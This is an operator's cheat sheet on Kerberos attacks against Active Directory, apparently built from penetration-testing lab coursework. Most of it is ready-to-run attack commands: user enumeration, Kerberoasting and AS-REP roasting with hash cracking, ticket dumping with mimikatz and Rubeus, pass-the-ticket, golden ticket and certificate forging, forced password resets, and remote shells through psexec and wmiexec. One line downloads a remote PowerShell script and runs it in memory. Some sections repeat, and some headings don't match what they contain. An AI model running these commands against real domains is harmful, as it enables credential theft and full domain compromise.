# Kerberos

## Overview

Authentication service reference for ticket handling, roasting, basic enumeration, and operational caveats.

## Default Ports

- 88/tcp, 88/udp; often paired with 464/tcp+udp for password changes

## Quick Enumeration

```bash
nmap -sU -p 88 --script=krb5-enum-users <dc-ip>
kerbrute userenum -d <domain> --dc <dc-ip> users.txt
```

## Credentialed Access

```bash
kinit <user>@<DOMAIN>
klist
```
```bash
getTGT.py <domain>/<user>:<password> -dc-ip <dc-ip>
getST.py -spn cifs/<host> -impersonate <user> <domain>/<account>:<password> -dc-ip <dc-ip>
```

## Kerberoasting

```
# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs

# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Cracking Kerberos ticket hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap

# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
Find-InterestingDomainAcl

# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley

# Used to create a PSCredential Object from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

## ASREPRoasting

```
# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-ADTrust -Filter *

# PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-DomainTrust

# PowerView tool used to perform a domain trust mapping from a Windows-based host.
Get-DomainTrustMapping

# PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## Kerberoasting

```
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
.\Rubeus.exe kerberoast /outfile:<FILE>
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
```
```
impacket-getTGT <DOMAIN>/<USERNAME> -hashes <LMHASH>:<NTLMHASH>
```
```
impacket-getTGT <DOMAIN>/<USERNAME> -aesKey <KEY>
```
```
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```
```
.\Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<NTLMHASH> /ptt
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```
```
grep default_ccache_name /etc/krb5.conf
```
- If none return, default is FILE:/tmp/krb5cc\_%{uid}
- In Case of File Tickets it is possible to Copy-Paste them to use them
- In Case of being KEYRING Tickets, the Tool tickey can be used to get them
- To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
- To inject, the Ticket have to be copied in a reachable Folder by all Users
```
cp tickey /tmp/tickey
/tmp/tickey -i
```
```
sekurlsa::tickets /export
.\Rubeus dump
```
```
[IO.File]::WriteAllBytes("<TICKET>.kirbi", [Convert]::FromBase64String("<TICKET>"))
```

> [https://github.com/Zer1t0/ticket\_converter](https://github.com/Zer1t0/ticket_converter)

```
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```
```
kerberos::ptt <KIRBI_FILE>
```
```
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```

## Impacket Examples

```
python ticketer.py -nthash <NTLMHASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```
```
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN> -spn <SPN>  <USERNAME>
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

## mimikatz Examples

```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```
```
kerberos::ptt <KIRBI_FILE>
```

## Rubeus Examples

```
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```

## Impacket Examples

```
python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```
```
python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <DOMAIN>  <USERNAME>
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

## mimikatz Examples

```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```
```
kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```
```
kerberos::ptt <KIRBI_FILE>
```

## Rubeus Examples

```
.\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```
```
.\PsExec.exe -accepteula \\<RHOST> cmd
```
```
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

## Golden Ticket

```
.\SeManageVolumeExploit
```
```
certutil -store My
```
```
certutil -exportPFX My 75b2f4bbd71f108945247b466161bdph <FILE>.pfx
```
```
certipy-ad forge -ca-pfx '<FILE>.pfx' -upn 'Administrator@<DOMAIN>' -subject 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>'
```
```
certipy-ad auth -pfx administrator_forged.pfx -dc-ip <RHOST>
```

## Rubeus pass the ticket

```
Invoke-Rubeus ptt /ticket:<base64_ticket>
```

## ticketConverter.py Convert kribi to ccache

```
impacket-ticketConverter <kribi> <ccache>.ccache && export KRB5CCNAME=/tmp/<ccache>.ccache
```

## impacket Sliver Ticket for DC

```
getST.py -self -impersonate "Administrator" -altservice "cifs/<dc_hostname>" -k -no-pass -dc-ip <dc_ip> <domain>/'<dc_hostname>$'

export KRB5CCNAME=<ticket_from_output>.ccache
```

## Operator Notes

- Time skew breaks otherwise-correct Kerberos operations. Fix clock issues before burning time on bad credentials.
- Keep ticket files, exported ccaches, and shell environment handling explicit so you do not lose context mid-chain.
- Domain abuse details stay in `03 AD/Kerberos.md`; this page keeps the service handling front and center.

## See Also

- `03 AD/Kerberos.md`
- `03 AD/Domain Enumeration.md`
